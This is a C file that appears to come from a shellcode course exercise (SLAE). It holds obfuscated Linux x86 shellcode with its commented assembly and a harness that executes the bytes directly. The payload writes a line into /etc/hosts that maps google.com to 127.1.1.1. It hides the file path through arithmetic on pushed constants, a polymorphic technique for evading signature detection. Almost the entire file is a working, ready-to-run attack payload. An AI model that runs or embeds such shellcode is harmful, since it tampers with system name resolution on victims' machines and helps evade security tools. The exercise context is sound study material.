/*
 *  Linux x86 - map google.com to 127.1.1.1 in /etc/hosts
 *  Obfuscated version - 98 bytes
 *  Original: http://shell-storm.org/shellcode/files/shellcode-893.php
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/
 */

/*
global _start

section .text

_start:
    push byte 0x4
    pop eax
    inc eax
    sub edx, edx
    push edx
    mov ecx, 0x88998899
    sub ecx, 0x1525152A
    push ecx
    sub ecx, 0x0B454440
    push ecx
    sub ecx, 0x04BACA01
    inc ecx
    push ecx
    sub ecx, 0x6374612E
    mov ebx, esp
    int 0x80
    xchg eax, ebx
    jmp short _load_data

_write:
    pop eax
    xchg eax, ecx
    push byte 0x3
    pop esi
    mov eax, esi
    inc eax
    push len
    pop edx
    int 0x80
    inc esi
    inc esi
    inc esi
    xchg eax, esi
    int 0x80
    inc eax
    int 0x80

_load_data:
    call _write
    google: db "127.1.1.1 google.com"
    len: equ $-google

_random:
    cld
    xor esi,esi
    cld
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\x6a\x04\x58\x40\x29\xd2\x52\xb9\x99\x88\x99\x88\x81\xe9\x2a\x15\x25\x15"
"\x51\x81\xe9\x40\x44\x45\x0b\x51\x81\xe9\x01\xca\xba\x04\x41\x51\x81\xe9"
"\x2e\x61\x74\x63\x89\xe3\xcd\x80\x93\xeb\x16\x58\x91\x6a\x03\x5e\x89\xf0"
"\x40\x6a\x14\x5a\xcd\x80\x46\x46\x46\x96\xcd\x80\x40\xcd\x80\xe8\xe5\xff"
"\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65"
"\x2e\x63\x6f\x6d\xfc\x31\xf6\xfc";

int main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}